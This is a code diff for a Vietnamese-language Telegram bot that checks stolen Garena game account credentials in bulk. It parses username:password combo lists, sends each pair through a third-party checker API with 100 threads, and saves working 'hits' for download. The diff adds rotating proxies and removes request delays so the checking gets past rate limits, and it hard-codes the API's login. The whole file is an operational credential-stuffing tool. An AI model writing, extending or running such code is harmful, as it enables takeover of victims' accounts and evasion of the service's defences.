@@ -1,6 +1,6 @@
-# bot.py - GARENA CHECKER BOT V3.7 - API FIX ULTIMATE
+# bot.py - GARENA CHECKER BOT V4.0 - PROXY MANAGER
 # Tác giả: palofsc
-# Mục đích: Bot Telegram check acc với API chuẩn GET params
+# Mục đích: Bot Telegram check acc với hệ thống quản lý proxy
 
 import subprocess
 import sys
@@ -49,10 +49,10 @@ class RenderHandler(BaseHTTPRequestHandler):
 <html>
 <head><title>Garena Checker Bot</title></head>
 <body style="font-family:Arial;text-align:center;padding:50px;background:#0a0a0a;color:#00ff00;">
-<h1>Garena Checker Bot V3.7</h1>
+<h1>Garena Checker Bot V4.0</h1>
 <p>Status: <b style="color:#00ff00;">ALIVE</b></p>
 <p>Admin: <a href="https://t.me/baohuyno1" style="color:#00ff00;">@baohuyno1</a></p>
-<p>Version: <b>3.7 - API FIX ULTIMATE</b></p>
+<p>Version: <b>4.0 - PROXY MANAGER</b></p>
 </body>
 </html>"""
             self.wfile.write(html.encode('utf-8'))
@@ -93,9 +93,9 @@ API_USERNAME = "thaituduc"
 API_PASSWORD = "thaituduc"
 
 DEFAULT_THREADS = 100
-DEFAULT_TIMEOUT = 30
+DEFAULT_TIMEOUT = 60
 DEFAULT_RETRIES = 3
-API_DELAY = 0.3
+API_DELAY = 0
 
 OUTPUT_HITS = "hits.txt"
 OUTPUT_DEAD = "dead.txt"
@@ -104,6 +104,7 @@ OUTPUT_ERROR = "error.txt"
 OUTPUT_RESULT = "result_full.txt"
 OUTPUT_CLEAN = "clean_accounts.txt"
 OUTPUT_LOC = "loc_accounts.txt"
+OUTPUT_PROXY = "proxy.txt"
 
 MAX_MESSAGE_LENGTH = 4000
 
@@ -178,6 +179,8 @@ SERVICE_ROUTES = {
 checking = False
 stop_event = threading.Event()
 pending_accounts = []
+proxy_list = []
+proxy_lock = threading.Lock()
 stats = {"total": 0, "checked": 0, "hits": 0, "dead": 0, "errors": 0, "unknown": 0}
 file_lock = threading.Lock()
 stats_lock = threading.Lock()
@@ -235,6 +238,7 @@ def create_main_keyboard():
         KeyboardButton("📝 Gui TK MK"),
         KeyboardButton("📁 Gui File TXT"),
         KeyboardButton("🔍 Loc TK MK"),
+        KeyboardButton("📤 Load Proxy"),
         KeyboardButton("📊 Trang thai"),
         KeyboardButton("📥 Tai Hits"),
         KeyboardButton("📥 Tai Dead"),
@@ -274,12 +278,130 @@ def create_admin_keyboard():
         InlineKeyboardButton("📥 Dead", callback_data="admin_dead"),
         InlineKeyboardButton("📥 Loc", callback_data="admin_loc"),
         InlineKeyboardButton("📥 Report", callback_data="admin_report"),
+        InlineKeyboardButton("📤 Proxy", callback_data="admin_proxy"),
         InlineKeyboardButton("⏹ Stop", callback_data="admin_stop"),
         InlineKeyboardButton("🗑 Clear", callback_data="admin_clear"),
         InlineKeyboardButton("📋 Services", callback_data="admin_services")
     ]
     keyboard.add(*buttons)
     return keyboard
+
+def create_start_keyboard():
+    """Tạo bàn phím cho lệnh /start"""
+    keyboard = InlineKeyboardMarkup(row_width=2)
+    buttons = [
+        InlineKeyboardButton("📝 Gui TK MK", callback_data="menu_send"),
+        InlineKeyboardButton("📁 Gui File TXT", callback_data="menu_file"),
+        InlineKeyboardButton("🔍 Loc TK MK", callback_data="menu_loc"),
+        InlineKeyboardButton("📤 Load Proxy", callback_data="menu_proxy"),
+        InlineKeyboardButton("📊 Trang thai", callback_data="menu_status"),
+        InlineKeyboardButton("📥 Tai Hits", callback_data="menu_hits"),
+        InlineKeyboardButton("📥 Tai Dead", callback_data="menu_dead"),
+        InlineKeyboardButton("📥 Tai Loc", callback_data="menu_download_loc"),
+        InlineKeyboardButton("📥 Tai Report", callback_data="menu_report"),
+        InlineKeyboardButton("⚡ Check All", callback_data="menu_checkall"),
+        InlineKeyboardButton("⏹ Dung check", callback_data="menu_stop"),
+        InlineKeyboardButton("👤 Admin", callback_data="menu_admin"),
+        InlineKeyboardButton("📋 Service", callback_data="menu_services"),
+        InlineKeyboardButton("💬 Lien he Admin", url="https://t.me/baohuyno1")
+    ]
+    keyboard.add(*buttons)
+    return keyboard
+
+# ========== QUẢN LÝ PROXY ==========
+def load_proxy_from_text(content):
+    """
+    Load proxy từ text
+    Format: ip:port hoặc ip:port:user:pass
+    """
+    global proxy_list
+    
+    proxies = []
+    lines = content.split('\n')
+    
+    for line in lines:
+        line = line.strip()
+        if not line:
+            continue
+        
+        # Kiểm tra format ip:port hoặc ip:port:user:pass
+        parts = line.split(':')
+        if len(parts) == 2:
+            # Format: ip:port
+            ip, port = parts
+            if is_valid_ip_port(ip, port):
+                proxies.append({
+                    "ip": ip,
+                    "port": port,
+                    "user": "",
+                    "password": "",
+                    "full": f"{ip}:{port}"
+                })
+        elif len(parts) == 4:
+            # Format: ip:port:user:pass
+            ip, port, user, password = parts
+            if is_valid_ip_port(ip, port):
+                proxies.append({
+                    "ip": ip,
+                    "port": port,
+                    "user": user,
+                    "password": password,
+                    "full": f"{ip}:{port}:{user}:{password}"
+                })
+    
+    with proxy_lock:
+        proxy_list = proxies
+    
+    return len(proxies)
+
+def is_valid_ip_port(ip, port):
+    """Kiểm tra ip và port hợp lệ"""
+    try:
+        port_num = int(port)
+        if port_num < 1 or port_num > 65535:
+            return False
+        
+        # Kiểm tra IP format
+        ip_parts = ip.split('.')
+        if len(ip_parts) == 4:
+            for part in ip_parts:
+                num = int(part)
+                if num < 0 or num > 255:
+                    return False
+            return True
+        
+        # Kiểm tra domain format
+        if re.match(r'^[a-zA-Z0-9.-]+$', ip):
+            return True
+        
+        return False
+    except:
+        return False
+
+def get_random_proxy():
+    """Lấy proxy ngẫu nhiên từ danh sách"""
+    with proxy_lock:
+        if not proxy_list:
+            return None
+        return random.choice(proxy_list)
+
+def build_proxy_string(proxy):
+    """Tạo chuỗi proxy cho API"""
+    if not proxy:
+        return ""
+    
+    if proxy["user"] and proxy["password"]:
+        return f"{proxy['user']}:{proxy['password']}@{proxy['ip']}:{proxy['port']}"
+    else:
+        return f"{proxy['ip']}:{proxy['port']}"
+
+def save_proxy_file():
+    """Lưu danh sách proxy vào file"""
+    with file_lock:
+        with open(OUTPUT_PROXY, 'w', encoding='utf-8') as f:
+            with proxy_lock:
+                for proxy in proxy_list:
+                    f.write(f"{proxy['full']}\n")
 
 # ========== LỌC TK MK ULTRA CHUYÊN NGHIỆP ==========
 def loc_tk_mk_only(content):
@@ -294,13 +416,9 @@ def loc_tk_mk_only(content):
     if not content:
         return accounts, stats_loc
     
-    # Pattern chuẩn user:pass
     pattern_standard = r'(?<![a-zA-Z0-9_])([a-zA-Z0-9][a-zA-Z0-9_.@-]{1,50}):([a-zA-Z0-9_.@!$%^&*()\-]{1,100})(?![a-zA-Z0-9_])'
-    
-    # Pattern FINAL = user:pass
     pattern_final = r'FINAL\s*[=:]\s*([a-zA-Z0-9][a-zA-Z0-9_.@-]{1,50}):([a-zA-Z0-9_.@!$%^&*()\-]{1,100})'
     
-    # Từ khóa loại bỏ
     skip_patterns = [
         r'^https?://', r'^www\.', r'\.com$', r'\.net$', r'\.org$',
         r'^shop', r'^share', r'^final', r'^name', r'^level', r'^rank',
@@ -310,7 +428,6 @@ def loc_tk_mk_only(content):
         r'^tuong', r'^skin', r'^authen', r'^so:', r'^qu[âa]n', r'^v[ôo]'
     ]
     
-    # Thử tìm FINAL pattern trước
     final_matches = re.findall(pattern_final, content, re.IGNORECASE)
     if final_matches:
         for user, pwd in final_matches:
@@ -326,11 +443,9 @@ def loc_tk_mk_only(content):
         stats_loc["total"] = len(final_matches)
         return accounts, stats_loc
     
-    # Tách thành các dòng
     lines = content.split('\n')
     stats_loc["total"] = len(lines)
     
-    # Xử lý từng dòng
     for line in lines:
         line = line.strip()
         if not line:
@@ -350,7 +465,6 @@ def loc_tk_mk_only(content):
                 else:
                     stats_loc["invalid"] += 1
     
-    # Nếu không tìm thấy, thử tìm trong toàn bộ nội dung
     if not accounts:
         all_matches = re.findall(pattern_standard, content)
         for user, pwd in all_matches:
@@ -399,12 +513,9 @@ def save_loc_file(accounts):
             for user, pwd in accounts:
                 f.write(f"{user}:{pwd}\n")
 
-# ========== CHECK API - CHUẨN GET PARAMS ==========
+# ========== CHECK API - HỖ TRỢ PROXY ==========
 def check_account_api(username, password, service):
-    """
-    Gọi API để kiểm tra tài khoản
-    Sử dụng đúng định dạng GET params theo API docs
-    """
+    """Gọi API để kiểm tra tài khoản với proxy"""
     cache_key = f"{username}:{password}:{service}"
     with cache_lock:
         if cache_key in cache_results:
@@ -417,14 +528,11 @@ def check_account_api(username, password, service):
     
     url = f"{API_BASE}{route}"
     
-    # Tạo params theo đúng format API yêu cầu
-    # Format: ?username=api_user&password=api_pass&tk=acc&mk=pass&proxy=
     params = {
         "username": API_USERNAME,
         "password": API_PASSWORD
     }
     
-    # Thêm tk và mk vào params
     if len(param_names) >= 2:
         params[param_names[0]] = username
         params[param_names[1]] = password
@@ -432,9 +540,15 @@ def check_account_api(username, password, service):
         params["tk"] = username
         params["mk"] = password
     
-    # Thêm extra params nếu có
-    for key, value in extra_params.items():
-        params[key] = value
+    # Thêm proxy nếu có
+    proxy = get_random_proxy()
+    if proxy:
+        proxy_str = build_proxy_string(proxy)
+        if "proxy" in extra_params or service in ["lienquan", "deltaforce", "fc", "fullpack"]:
+            params["proxy"] = proxy_str
+    else:
+        for key, value in extra_params.items():
+            params[key] = value
     
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
@@ -443,19 +557,9 @@ def check_account_api(username, password, service):
         "Connection": "keep-alive"
     }
     
-    # Thêm delay ngẫu nhiên để tránh rate limit
-    time.sleep(API_DELAY + random.uniform(0, 0.1))
-    
     for attempt in range(DEFAULT_RETRIES):
         try:
-            print(f"[DEBUG] URL: {url}")
-            print(f"[DEBUG] Params: {json.dumps(params, ensure_ascii=False)}")
-            
-            # Sử dụng GET request với params
             resp = requests.get(url, params=params, headers=headers, timeout=DEFAULT_TIMEOUT)
-            
-            print(f"[DEBUG] Status: {resp.status_code}")
-            print(f"[DEBUG] Response: {resp.text[:500]}")
             
             if resp.status_code == 200:
                 try:
@@ -464,7 +568,6 @@ def check_account_api(username, password, service):
                     if isinstance(result_data, dict):
                         is_hit = False
                         
-                        # Check status
                         status_val = result_data.get("status")
                         if status_val is not None:
                             if status_val in [True, "true", 1, "1", "True", "TRUE", "success", "Success", "SUCCESS"]:
@@ -472,7 +575,6 @@ def check_account_api(username, password, service):
                             elif status_val in [False, "false", 0, "0", "False", "FALSE", "fail", "Fail", "FAIL", "dead", "Dead", "DEAD"]:
                                 is_hit = False
                         
-                        # Check success
                         success_val = result_data.get("success")
                         if not is_hit and success_val is not None:
                             if success_val in [True, "true", 1, "1", "True", "TRUE"]:
@@ -480,7 +582,6 @@ def check_account_api(username, password, service):
                             elif success_val in [False, "false", 0, "0", "False", "FALSE"]:
                                 is_hit = False
                         
-                        # Check result
                         result_val = result_data.get("result")
                         if result_val is not None:
                             result_str = str(result_val).lower()
@@ -489,7 +590,6 @@ def check_account_api(username, password, service):
                             elif result_str in ["dead", "false", "fail", "invalid", "0", "die", "error"]:
                                 is_hit = False
                         
-                        # Check message
                         message_val = result_data.get("message", "")
                         if message_val:
                             msg_lower = str(message_val).lower()
@@ -498,29 +598,20 @@ def check_account_api(username, password, service):
                             elif any(word in msg_lower for word in ["thất bại", "that bai", "fail", "invalid", "dead", "sai", "không đúng", "khong dung", "die", "error"]):
                                 is_hit = False
                         
-                        # Check data
                         data_val = result_data.get("data")
                         if data_val is not None:
-                            if isinstance(data_val, dict) and data_val:
-                                is_hit = True
-                            elif isinstance(data_val, list) and data_val:
-                                is_hit = True
-                            elif isinstance(data_val, str) and data_val:
+                            if isinstance(data_val, (dict, list, str)) and data_val:
                                 is_hit = True
                         
-                        # Check info fields
                         info_fields = ["uid", "id", "name", "nickname", "account", "info", "user", "player", "level", "rank", "email", "phone", "sdt"]
                         for field in info_fields:
                             if field in result_data and result_data[field] is not None and result_data[field] != "":
                                 is_hit = True
                                 break
                         
-                        # Lưu toàn bộ thông tin response
                         result_data["_raw_response"] = result_data.copy()
                         result_data["result"] = "hit" if is_hit else "dead"
                         result_data["_is_hit"] = is_hit
-                        
-                        print(f"[DEBUG] Final Result: {result_data['result']}")
                         
                         with cache_lock:
                             cache_results[cache_key] = result_data
@@ -545,36 +636,41 @@ def check_account_api(username, password, service):
                     return result
                     
             elif resp.status_code == 429:
-                time.sleep(5 * (attempt + 1))
+                retry_after = resp.headers.get("Retry-After", "5")
+                try:
+                    wait_time = int(retry_after)
+                except:
+                    wait_time = 5 * (attempt + 1)
+                time.sleep(wait_time)
                 continue
             elif resp.status_code == 401:
-                # Sai API credentials
                 result = {"result": "error", "_error": "Invalid API credentials"}
                 with cache_lock:
                     cache_results[cache_key] = result
                 return result
             elif resp.status_code == 403:
-                # Forbidden
                 result = {"result": "error", "_error": "Forbidden access"}
                 with cache_lock:
                     cache_results[cache_key] = result
                 return result
             else:
-                time.sleep(1)
+                time.sleep(2)
                 continue
                 
         except requests.exceptions.Timeout:
-            time.sleep(2)
-            continue
+            if attempt < DEFAULT_RETRIES - 1:
+                time.sleep(3)
+                continue
         except requests.exceptions.ConnectionError:
-            time.sleep(3)
-            continue
-        except Exception as e:
-            print(f"[DEBUG] Exception: {e}")
-            time.sleep(2)
-            continue
+            if attempt < DEFAULT_RETRIES - 1:
+                time.sleep(5)
+                continue
+        except Exception:
+            if attempt < DEFAULT_RETRIES - 1:
+                time.sleep(3)
+                continue
     
-    result = {"result": "error", "_error": "All retries failed"}
+    result = {"result": "error", "_error": "All retries failed - API not responding"}
     with cache_lock:
         cache_results[cache_key] = result
     return result
@@ -681,11 +777,16 @@ def check_batch(chat_id, accounts, service):
     service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
     icon = SERVICE_ROUTES.get(service, {}).get("icon", "🔍")
     
+    with proxy_lock:
+        proxy_count = len(proxy_list)
+    
     safe_send_message(chat_id, f"""
 {icon} <b>BAT DAU CHECK</b>
 📊 Tong: <code>{total}</code> accounts
 🎯 Service: <b>{service_desc}</b>
 ⚡ Threads: <code>{DEFAULT_THREADS}</code>
+📤 Proxy: <code>{proxy_count}</code>
+⏱ Timeout: <code>{DEFAULT_TIMEOUT}s</code>
 """)
     
     def process_single(user, pwd):
@@ -723,6 +824,7 @@ def check_batch(chat_id, accounts, service):
 ✅ Checked: <code>{stats['checked']}/{total}</code> ({percent:.1f}%)
 🔴 Hits: <code>{stats['hits']}</code>
 ❌ Dead: <code>{stats['dead']}</code>
+⚠️ Errors: <code>{stats['errors']}</code>
 ⚡ Speed: <code>{speed:.1f}</code> acc/s
 """)
                 except:
@@ -776,10 +878,15 @@ def check_all_services(chat_id, accounts):
     total_accounts = len(accounts)
     total_services = len(SERVICE_ROUTES)
     
+    with proxy_lock:
+        proxy_count = len(proxy_list)
+    
     safe_send_message(chat_id, f"""
 ⚡ <b>CHECK TAT CA SERVICE</b>
 📊 Accounts: <code>{total_accounts}</code>
 📋 Services: <code>{total_services}</code>
+📤 Proxy: <code>{proxy_count}</code>
+⏱ Timeout: <code>{DEFAULT_TIMEOUT}s</code>
 """)
     
     stats_all = {
@@ -849,6 +956,11 @@ def handle_callback(call):
     
     data = call.data
     
+    # Xử lý menu từ /start
+    if data.startswith("menu_"):
+        handle_menu_callback(call)
+        return
+    
     if data.startswith("check_"):
         service = data.replace("check_", "")
         
@@ -886,6 +998,8 @@ def handle_callback(call):
         if checking:
             elapsed = time.time() - stats.get("start_time", time.time())
             speed = stats["checked"] / elapsed if elapsed > 0 else 0
+            with proxy_lock:
+                proxy_count = len(proxy_list)
             safe_send_message(call.message.chat.id, f"""
 📊 TRANG THAI
 🔄 Dang check: YES
@@ -893,10 +1007,13 @@ def handle_callback(call):
 🔴 HIT: {stats['hits']}
 ❌ DEAD: {stats['dead']}
 ⚠️ Errors: {stats['errors']}
+📤 Proxy: {proxy_count}
 ⚡ Speed: {speed:.1f} acc/s
 """)
         else:
-            safe_send_message(call.message.chat.id, "💤 Bot dang ranh")
+            with proxy_lock:
+                proxy_count = len(proxy_list)
+            safe_send_message(call.message.chat.id, f"💤 Bot dang ranh\n📤 Proxy: {proxy_count}")
         bot.answer_callback_query(call.id)
     
     elif data == "admin_hits":
@@ -931,6 +1048,14 @@ def handle_callback(call):
             safe_send_message(call.message.chat.id, "❌ Chua co report!")
         bot.answer_callback_query(call.id)
     
+    elif data == "admin_proxy":
+        try:
+            with open(OUTPUT_PROXY, 'rb') as f:
+                bot.send_document(call.message.chat.id, f, caption="📤 proxy.txt")
+        except:
+            safe_send_message(call.message.chat.id, "❌ Chua co proxy!")
+        bot.answer_callback_query(call.id)
+    
     elif data == "admin_stop":
         stop_event.set()
         checking = False
@@ -948,6 +1073,102 @@ def handle_callback(call):
             msg += f"{value['icon']} {value['desc']}\n"
         safe_send_message(call.message.chat.id, msg)
         bot.answer_callback_query(call.id)
+    
+    bot.answer_callback_query(call.id)
+
+def handle_menu_callback(call):
+    """Xử lý các nút menu từ /start"""
+    global pending_accounts
+    
+    data = call.data
+    
+    if data == "menu_send":
+        safe_send_message(call.message.chat.id, """
+📌 GUI TK MK
+Gui truc tiep user:pass
+
+VD:
+anhduckim1:kimanhduc1
+""")
+    elif data == "menu_file":
+        safe_send_message(call.message.chat.id, "📌 Gui file .txt chua danh sach")
+    elif data == "menu_loc":
+        safe_send_message(call.message.chat.id, """
+🔍 LOC TK MK CHUYÊN NGHIỆP
+Gui file .txt hoặc text share
+Bot tự động lọc user:pass từ mọi định dạng
+""")
+    elif data == "menu_proxy":
+        safe_send_message(call.message.chat.id, """
+📤 LOAD PROXY
+
+📡 Proxy cá nhân: 1
+
+Gửi file .txt với format:
+ip:port hoặc ip:port:user:pass
+""")
+    elif data == "menu_status":
+        if checking:
+            elapsed = time.time() - stats.get("start_time", time.time())
+            speed = stats["checked"] / elapsed if elapsed > 0 else 0
+            with proxy_lock:
+                proxy_count = len(proxy_list)
+            safe_send_message(call.message.chat.id, f"""
+📊 TRANG THAI
+🔄 Dang check: YES
+✅ Checked: {stats['checked']}/{stats['total']}
+🔴 HIT: {stats['hits']}
+❌ DEAD: {stats['dead']}
+⚠️ Errors: {stats['errors']}
+📤 Proxy: {proxy_count}
+⚡ Speed: {speed:.1f} acc/s
+""")
+        else:
+            with proxy_lock:
+                proxy_count = len(proxy_list)
+            safe_send_message(call.message.chat.id, f"💤 Bot dang ranh\n📤 Proxy: {proxy_count}")
+    elif data == "menu_hits":
+        try:
+            with open(OUTPUT_HITS, 'rb') as f:
+                bot.send_document(call.message.chat.id, f, caption="✅ hits.txt")
+        except:
+            safe_send_message(call.message.chat.id, "❌ Chua co hits!")
+    elif data == "menu_dead":
+        try:
+            with open(OUTPUT_DEAD, 'rb') as f:
+                bot.send_document(call.message.chat.id, f, caption="❌ dead.txt")
+        except:
+            safe_send_message(call.message.chat.id, "❌ Chua co dead!")
+    elif data == "menu_download_loc":
+        try:
+            with open(OUTPUT_LOC, 'rb') as f:
+                bot.send_document(call.message.chat.id, f, caption="📥 loc_accounts.txt")
+        except:
+            safe_send_message(call.message.chat.id, "❌ Chua co file loc!")
+    elif data == "menu_report":
+        try:
+            with open(OUTPUT_RESULT, 'rb') as f:
+                bot.send_document(call.message.chat.id, f, caption="📊 report.txt")
+        except:
+            safe_send_message(call.message.chat.id, "❌ Chua co report!")
+    elif data == "menu_checkall":
+        if pending_accounts:
+            accounts = pending_accounts
+            pending_accounts = []
+            threading.Thread(target=check_all_services, args=(call.message.chat.id, accounts)).start()
+        else:
+            safe_send_message(call.message.chat.id, "❌ Khong co accounts!")
+    elif data == "menu_stop":
+        stop_event.set()
+        checking = False
+        safe_send_message(call.message.chat.id, "🛑 Da dung check!")
+    elif data == "menu_admin":
+        safe_send_message(call.message.chat.id, "👤 ADMIN\n@baohuyno1", reply_markup=create_admin_keyboard())
+    elif data == "menu_services":
+        msg = "📋 DANH SACH SERVICE\n\n"
+        for key, value in SERVICE_ROUTES.items():
+            msg += f"{value['icon']} {value['desc']}\n"
+        safe_send_message(call.message.chat.id, msg)
     
     bot.answer_callback_query(call.id)
 
@@ -984,10 +1205,23 @@ Bot tự động lọc user:pass từ mọi định dạng
 """)
         return
     
+    elif text == "📤 Load Proxy":
+        safe_send_message(message.chat.id, """
+📤 LOAD PROXY
+
+📡 Proxy cá nhân: 1
+
+Gửi file .txt với format:
+ip:port hoặc ip:port:user:pass
+""")
+        return
+    
     elif text == "📊 Trang thai":
         if checking:
             elapsed = time.time() - stats.get("start_time", time.time())
             speed = stats["checked"] / elapsed if elapsed > 0 else 0
+            with proxy_lock:
+                proxy_count = len(proxy_list)
             safe_send_message(message.chat.id, f"""
 📊 TRANG THAI
 🔄 Dang check: YES
@@ -995,10 +1229,13 @@ Bot tự động lọc user:pass từ mọi định dạng
 🔴 HIT: {stats['hits']}
 ❌ DEAD: {stats['dead']}
 ⚠️ Errors: {stats['errors']}
+📤 Proxy: {proxy_count}
 ⚡ Speed: {speed:.1f} acc/s
 """)
         else:
-            safe_send_message(message.chat.id, "💤 Bot dang ranh")
+            with proxy_lock:
+                proxy_count = len(proxy_list)
+            safe_send_message(message.chat.id, f"💤 Bot dang ranh\n📤 Proxy: {proxy_count}")
         return
     
     elif text == "📥 Tai Hits":
@@ -1110,6 +1347,28 @@ def handle_document(message):
         file_info = bot.get_file(message.document.file_id)
         content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
         
+        # Kiểm tra xem có phải file proxy không
+        # Nếu nội dung chứa ip:port pattern
+        proxy_pattern = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}'
+        if re.search(proxy_pattern, content):
+            # Load proxy
+            proxy_count = load_proxy_from_text(content)
+            save_proxy_file()
+            safe_send_message(message.chat.id, f"""
+✅ LOAD PROXY THANH CONG!
+📤 Tong proxy: {proxy_count}
+
+Format: ip:port hoặc ip:port:user:pass
+""")
+            # Gửi file proxy đã lưu
+            with open(OUTPUT_PROXY, 'rb') as f:
+                try:
+                    bot.send_document(message.chat.id, f, caption=f"📤 proxy.txt ({proxy_count} proxies)")
+                except:
+                    pass
+            return
+        
+        # Lọc tài khoản
         accounts, stats_loc = loc_tk_mk_only(content)
         
         if not accounts:
@@ -1122,12 +1381,16 @@ def handle_document(message):
         preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:20]])
         total = len(accounts)
         
+        with proxy_lock:
+            proxy_count = len(proxy_list)
+        
         msg = f"""
 ✅ LOC XONG!
 📊 Tong: {total} accounts
 ✅ Valid: {stats_loc['valid']}
 ❌ Invalid: {stats_loc['invalid']}
 🔄 Duplicate: {stats_loc['duplicate']}
+📤 Proxy: {proxy_count}
 
 Preview (20 dong dau):
 {preview}
@@ -1157,21 +1420,36 @@ def cmd_start(message):
     hours = uptime.seconds // 3600
     minutes = (uptime.seconds % 3600) // 60
     
+    with proxy_lock:
+        proxy_count = len(proxy_list)
+    
     bot.send_message(
         message.chat.id,
         f"""
-🤖 GARENA CHECKER BOT V3.7
+🤖 <b>GARENA CHECKER BOT V4.0</b>
 👤 Admin: @baohuyno1
 ⏱ Uptime: {hours}h {minutes}m
+📤 Proxy: {proxy_count}
 
-📌 CACH DUNG:
+📌 <b>CACH DUNG:</b>
 1. Gui user:pass -> Chon service
 2. Gui file .txt -> Tu dong loc
-3. Gui share phuc tap -> Bot loc tu dong
+3. Load proxy -> Check nhanh hon
 
-🔧 API da fix chuẩn GET params
-💡 Loc moi dinh dang share
+🔧 <b>TINH NANG:</b>
+✅ Loc tai khoan chuyen nghiep
+✅ Check nhieu service
+✅ Load proxy ip:port
+✅ Gui file .txt
+✅ Auto save ket qua
 """,
+        reply_markup=create_start_keyboard()
+    )
+    
+    # Gửi thêm bàn phím chính
+    bot.send_message(
+        message.chat.id,
+        "👇 <b>Hoac su dung ban phim chinh:</b>",
         reply_markup=create_main_keyboard()
     )
 
@@ -1179,13 +1457,15 @@ def cmd_start(message):
 def main():
     """Hàm chính khởi động bot"""
     print("=" * 60)
-    print("    GARENA CHECKER BOT V3.7 - API FIX ULTIMATE")
+    print("    GARENA CHECKER BOT V4.0 - PROXY MANAGER")
     print("    ADMIN: @baohuyno1")
     print("=" * 60)
     print(f"[*] Threads: {DEFAULT_THREADS}")
+    print(f"[*] Timeout: {DEFAULT_TIMEOUT}s")
     print(f"[*] Services: {len(SERVICE_ROUTES)}")
     print(f"[*] API Base: {API_BASE}")
     print(f"[*] API User: {API_USERNAME}")
+    print(f"[*] Proxy: {len(proxy_list)}")
     print("=" * 60)
     
     while True:
